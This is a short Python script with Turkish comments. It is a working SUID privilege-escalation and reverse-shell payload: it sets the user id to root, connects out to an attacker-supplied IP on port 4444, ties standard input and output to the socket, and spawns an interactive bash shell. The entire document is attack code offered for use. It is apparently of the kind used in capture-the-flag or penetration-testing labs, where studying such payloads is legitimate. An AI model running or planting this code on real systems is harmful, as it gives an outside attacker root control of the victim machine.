import socket, os, pty

# Kendi makinenin IP adresini ve dinlediğin portu yaz
ip = "KENDI_IP_ADRESIN" 
port = 4444

# SUID yetkisini kullanarak root yetkisine geç
os.setuid(0)

# Ters bağlantıyı kur
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Standart giriş, çıkış ve hatayı sokete yönlendir
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Root shell'i başlat
pty.spawn("/bin/bash")